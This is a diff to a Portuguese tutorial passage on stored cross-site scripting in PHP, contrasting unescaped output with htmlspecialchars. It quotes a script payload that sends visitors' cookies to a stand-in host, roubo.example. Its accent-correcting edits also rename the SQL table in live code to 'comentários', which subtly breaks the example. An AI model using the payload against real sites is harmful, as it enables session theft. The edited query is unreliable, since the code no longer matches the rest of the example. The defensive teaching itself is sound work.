@@ -38,16 +38,18 @@ DOM-BASED (ja visto: innerHTML vs textContent)
 Um formulário de comentário, um apelido, uma avaliação de cliente: qualquer dado de usuário SALVO e depois reexibido a outros visitantes é um alvo stored se não for escapado no momento da exibição.
 
 ```php
-// Salvamento (sem risco aqui por si so: estamos apenas armazenando texto)
-$pdo->prepare("INSERT INTO comentarios (texto) VALUES (?)")->execute([$comentario]);
+// Salvamento (sem risco aqui por si só: estamos apenas armazenando texto)
+$pdo->prepare("INSERT INTO comentários (texto) VALUES (?)")->execute([$comentario]);
 
 // PERIGOSO: reexibido depois, sem escape
 foreach ($comentarios as $c) {
-    echo $c['texto'];  // se um atacante postou <script>document.location='https://roubo.example/?c='+document.cookie</script>,
-                        // ESSE CODIGO EXECUTA em CADA visitante que ve esse comentario
+    // se um atacante postou
+    // <script>document.location='https://roubo.example/?c='+document.cookie</script>,
+    echo $c['texto'];
+                        // ESSE Código EXECUTA em CADA visitante que ve esse comentário
 }
 
-// SEGURO: mesmo reflexo do reflected, aplicado no momento da EXIBICAO, nao do salvamento
+// SEGURO: mesmo reflexo do reflected, aplicado no momento da EXIBIÇÃO, não do salvamento
 foreach ($comentarios as $c) {
     echo htmlspecialchars($c['texto']);
 }
